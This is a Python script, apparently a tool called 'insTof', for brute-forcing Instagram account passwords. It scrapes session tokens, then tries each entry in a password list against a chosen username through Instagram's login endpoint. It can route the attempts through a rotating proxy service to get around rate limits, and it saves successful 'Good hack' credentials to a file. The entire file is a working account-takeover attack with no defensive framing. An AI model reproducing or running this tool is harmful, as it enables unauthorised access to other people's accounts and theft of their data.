import requests
import re
import asyncio
import time
from aiohttp import ClientSession, ClientTimeout
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from aiohttp import ClientSession, ClientTimeout
from aiohttp_socks import ProxyConnector
import ssl

BRIGHTDATA_PROXY = "brd.superproxy.io:33335" # Your link from bright data | https://brightdata.com
CA_CERT_PATH = "SSL.crt"  # Set CA certificate path

normal_color = "\33[00m"
info_color = "\033[1;33m"
red_color = "\033[1;31m"
green_color = "\033[1;32m"
whiteB_color = "\033[1;37m"
detect_color = "\033[1;34m"
banner_color="\033[1;33;40m"
end_banner_color="\33[00m"

def Logo():
    print(detect_color+'''
                               ....
                                    %
                                     ^
                            L
                            "F3  $r
                           $$$$.e$"  .
                           "$$$$$"   "
     (insTof by 8.4v)        $$$$c  /
        .                   $$$$$$$P
       ."c                      $$$
      .$c3b                  ..J$$$$$e
      4$$$$             .$$$$$$$$$$$$$$c
       $$$$b           .$$$$$$$$$$$$$$$$r
          $$$.        .$$$$$$$$$$$$$$$$$$
           $$$c      .$$$$$$$  "$$$$$$$$$r
==============================================
[developer] => FaLaH - 0xfff0800 [developer_email] => flaaah777@gmail.com ) 
[developer_snapchat] => flaah999
==============================================
          
''')


def GetCSRF_Token(use_proxy=False):
    headers = {
        'Host': 'www.instagram.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36',
    }
    proxies = {'http': BRIGHTDATA_PROXY, 'https': BRIGHTDATA_PROXY} if use_proxy else None

    response = requests.get('https://www.instagram.com/', headers=headers, proxies=proxies, verify=False)
    csrf_token = re.search(r'csrftoken=([a-zA-Z0-9\-_]+)', response.headers.get('Set-Cookie', ''))
    csrf_token_value = csrf_token.group(1) if csrf_token else None

    html_content = response.text
    device_id_match = re.search(r'"device_id":"([a-zA-Z0-9\-]+)"', html_content)
    device_id = device_id_match.group(1) if device_id_match else None

    return csrf_token_value, device_id


def Get_MID(csrf_token_value, use_proxy=False):
    cookies = {'csrftoken': csrf_token_value}
    headers = {
        'Host': 'www.instagram.com',
        'X-CSRFToken': csrf_token_value,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36',
    }
    proxies = {'http': BRIGHTDATA_PROXY, 'https': BRIGHTDATA_PROXY} if use_proxy else None

    response = requests.get('https://www.instagram.com/api/v1/web/data/shared_data/', cookies=cookies, headers=headers, proxies=proxies, verify=False)
    mid = re.search(r'mid=([^;]+)', response.headers.get('Set-Cookie', ''))
    return mid.group(1) if mid else None


def generate_enc_password(password):
    timestamp = int(time.time())
    return f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"


async def attempt_login(session, username, password, csrf_token, device_id, mid):
    cookies = {
        'csrftoken': csrf_token,
        'mid': mid,
        'ig_did': device_id,
    }

    headers = {
        'Host': 'www.instagram.com',
        'X-CSRFToken': csrf_token,
        'X-IG-App-ID': '936619743392459',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Origin': 'https://www.instagram.com',
        'Referer': 'https://www.instagram.com/accounts/login/?next=%2Flogin%2F&source=desktop_nav',
    }

    data = {
        'enc_password': generate_enc_password(password),
        'username': username,
        'queryParams': '{"next":"/login/","source":"desktop_nav"}',
        'optIntoOneTap': 'false',
        'trustedDeviceRecords': '{}',
    }

    async with session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                            cookies=cookies, headers=headers, data=data) as response:
        return await response.json()


async def main():
    username = input("Username: ")
    passwords_file = input("Password List File: ")
    use_proxy = input("Use Bright Data proxy? (yes/no): ").strip().lower() == "yes"

    async def read_file(file_path):
        try:
            with open(file_path, 'r') as file:
                return file.read().splitlines()
        except FileNotFoundError:
            print(f"File not found: {file_path}")
            return []

    passwords = await read_file(passwords_file)

    csrf_token, device_id = GetCSRF_Token(use_proxy=use_proxy)
    if not csrf_token or not device_id:
        print("Failed to fetch CSRF token or Device ID.")
        return

    mid = Get_MID(csrf_token, use_proxy=use_proxy)
    if not mid:
        print("Failed to fetch MID.")
        return

    ssl_context = ssl.create_default_context(cafile=CA_CERT_PATH)
    connector = ProxyConnector.from_url(BRIGHTDATA_PROXY, ssl=ssl_context) if use_proxy else None

    timeout = ClientTimeout(total=60)
    async with ClientSession(connector=connector, timeout=timeout) as session:
        for password in passwords:
            try:
                result = await attempt_login(session, username, password, csrf_token, device_id, mid)
                if 'userId' in result:
                    print((red_color + ' --> Username : ' + green_color + username + red_color + ' --> Password : ' + green_color + password + ' --> Good hack'))
                    with open('good.txt', 'a') as file:
                        file.write(f"{username}:{password}\n")
                    return
                if 'checkpoint_url' in result:
                    print((red_color + ' --> Username : ' + green_color + username + red_color + ' --> Password : ' + green_color + password + ' --> Good hack'))
                    with open('good.txt', 'a') as file:
                        file.write(f"{username}:{password}\n")
                    return
                else:
                    print ((red_color + ' --> Username : ' + end_banner_color + username + red_color +' --> Password : '+ end_banner_color + password + red_color +' --> Error'))
            except Exception as e:
                print(f"Error during login attempt: {e}")
            await asyncio.sleep(1)

if __name__ == "__main__":
    Logo()
    asyncio.run(main())
